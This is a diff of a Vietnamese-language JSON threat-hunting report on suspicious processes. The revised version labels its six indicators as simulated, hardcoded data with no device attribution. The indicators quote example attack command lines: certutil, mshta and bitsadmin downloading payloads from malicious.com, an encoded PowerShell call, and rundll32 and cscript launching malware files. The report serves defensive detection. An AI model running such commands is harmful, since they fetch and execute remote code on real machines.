@@ -1,7 +1,36 @@
 {
-  "timestamp": "2026-09-13T15:51:16.047244",
+  "timestamp": "2026-09-13T16:01:14.031458",
+  "data_source": "SIMULATED",
+  "hunt_scope": {
+    "inventory_ips": [
+      "192.168.0.1",
+      "192.168.0.10",
+      "192.168.0.11",
+      "192.168.0.12",
+      "192.168.0.21",
+      "192.168.0.233",
+      "192.168.0.3",
+      "192.168.0.4",
+      "192.168.0.5",
+      "192.168.0.51",
+      "192.168.0.8"
+    ],
+    "arp_visible_ips": [
+      "192.168.0.1",
+      "192.168.0.21",
+      "192.168.0.233"
+    ],
+    "in_inventory_and_live": [
+      "192.168.0.1",
+      "192.168.0.21",
+      "192.168.0.233"
+    ],
+    "resolved_at_layer2": true,
+    "method": "assets.json + arp -a"
+  },
+  "attribution_note": "6 ch\u1ec9 b\u00e1o l\u00e0 d\u1eef li\u1ec7u M\u00d4 PH\u1eceNG hardcode trong script, kh\u00f4ng ph\u1ea3i quan s\u00e1t t\u1eeb m\u00e1y th\u1eadt. Kh\u00f4ng quy k\u1ebft thi\u1ebft b\u1ecb. Mu\u1ed1n quy k\u1ebft th\u1eadt, hunting ph\u1ea3i g\u1ecdi MCP tool t\u01b0\u01a1ng \u1ee9ng.",
   "hunting_type": "Suspicious Processes",
-  "question": "Có quy trình bất thường nào đang chạy không?",
+  "question": "C\u00f3 quy tr\u00ecnh b\u1ea5t th\u01b0\u1eddng n\u00e0o \u0111ang ch\u1ea1y kh\u00f4ng?",
   "total_detections": 6,
   "by_severity": {
     "HIGH": 4,
@@ -15,7 +44,7 @@
     "Script Engines": 1,
     "Living Off The Land": 1
   },
-  "impact_assessment": "HIGH: Phát hiện multiple suspicious processes",
+  "impact_assessment": "HIGH: Ph\u00e1t hi\u1ec7n multiple suspicious processes",
   "indicators": [
     {
       "type": "Suspicious Process Detection",
@@ -23,12 +52,24 @@
       "command_line": "powershell.exe -enc JABjAG8A...",
       "category": "PowerShell Encoded",
       "severity": "HIGH",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "PowerShell với encoded command - thường dùng cho obfuscation",
-      "impact": "Thực thi code ẩn",
-      "recommendation": "Điều tra process PowerShell.exe, cân nhắc terminate nếu xác nhận malicious",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "PowerShell v\u1edbi encoded command - th\u01b0\u1eddng d\u00f9ng cho obfuscation",
+      "impact": "Th\u1ef1c thi code \u1ea9n",
+      "recommendation": "\u0110i\u1ec1u tra process PowerShell.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     },
     {
       "type": "Suspicious Process Detection",
@@ -36,12 +77,24 @@
       "command_line": "certutil.exe -urlcache -f http://malicious.com/file.exe",
       "category": "CertUtil Suspicious",
       "severity": "HIGH",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "CertUtil dùng cho tải file hoặc decode",
-      "impact": "Tải malware hoặc decode shellcode",
-      "recommendation": "Điều tra process certutil.exe, cân nhắc terminate nếu xác nhận malicious",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "CertUtil d\u00f9ng cho t\u1ea3i file ho\u1eb7c decode",
+      "impact": "T\u1ea3i malware ho\u1eb7c decode shellcode",
+      "recommendation": "\u0110i\u1ec1u tra process certutil.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     },
     {
       "type": "Suspicious Process Detection",
@@ -49,12 +102,24 @@
       "command_line": "mshta.exe http://malicious.com/payload.hta",
       "category": "Mshta Suspicious",
       "severity": "HIGH",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "mshta dùng để execute HTML Application",
-      "impact": "Thực thi script ẩn",
-      "recommendation": "Điều tra process mshta.exe, cân nhắc terminate nếu xác nhận malicious",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "mshta d\u00f9ng \u0111\u1ec3 execute HTML Application",
+      "impact": "Th\u1ef1c thi script \u1ea9n",
+      "recommendation": "\u0110i\u1ec1u tra process mshta.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     },
     {
       "type": "Suspicious Process Detection",
@@ -62,12 +127,24 @@
       "command_line": "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\temp\\malware.exe",
       "category": "rundll32 Suspicious",
       "severity": "MEDIUM",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "rundll32 có thể dùng cho DLL injection",
-      "impact": "Thực thi arbitrary code",
-      "recommendation": "Điều tra process rundll32.exe, cân nhắc terminate nếu xác nhận malicious",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "rundll32 c\u00f3 th\u1ec3 d\u00f9ng cho DLL injection",
+      "impact": "Th\u1ef1c thi arbitrary code",
+      "recommendation": "\u0110i\u1ec1u tra process rundll32.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     },
     {
       "type": "Suspicious Process Detection",
@@ -75,12 +152,24 @@
       "command_line": "cscript.exe //b //nologo malicious.vbs",
       "category": "Script Engines",
       "severity": "MEDIUM",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "Script engines có thể chạy malicious scripts",
-      "impact": "Thực thi VBScript hoặc JScript",
-      "recommendation": "Điều tra process cscript.exe, cân nhắc terminate nếu xác nhận malicious",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "Script engines c\u00f3 th\u1ec3 ch\u1ea1y malicious scripts",
+      "impact": "Th\u1ef1c thi VBScript ho\u1eb7c JScript",
+      "recommendation": "\u0110i\u1ec1u tra process cscript.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     },
     {
       "type": "Suspicious Process Detection",
@@ -88,12 +177,24 @@
       "command_line": "bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe",
       "category": "Living Off The Land",
       "severity": "HIGH",
-      "timestamp": "2026-09-13T15:51:16.047244",
-      "description": "Living off the land binary - dùng để bypass AV",
+      "timestamp": "2026-09-13T16:01:14.003518",
+      "description": "Living off the land binary - d\u00f9ng \u0111\u1ec3 bypass AV",
       "impact": "Bypass control mechanisms",
-      "recommendation": "Điều tra process bitsadmin.exe, cân nhắc terminate nếu xác nhận malicious",
+      "recommendation": "\u0110i\u1ec1u tra process bitsadmin.exe, c\u00e2n nh\u1eafc terminate n\u1ebfu x\u00e1c nh\u1eadn malicious",
       "detection_method": "Process command-line pattern matching",
-      "status": "DETECTED"
+      "status": "DETECTED",
+      "data_source": "SIMULATED",
+      "affected_systems": [],
+      "attribution": {
+        "method": "none",
+        "confidence": "NONE",
+        "reason": "Kh\u00f4ng c\u00f3 b\u1eb1ng ch\u1ee9ng g\u1eafn v\u1edbi thi\u1ebft b\u1ecb c\u1ee5 th\u1ec3"
+      },
+      "hunt_scope": [
+        "192.168.0.1",
+        "192.168.0.21",
+        "192.168.0.233"
+      ]
     }
   ]
 }
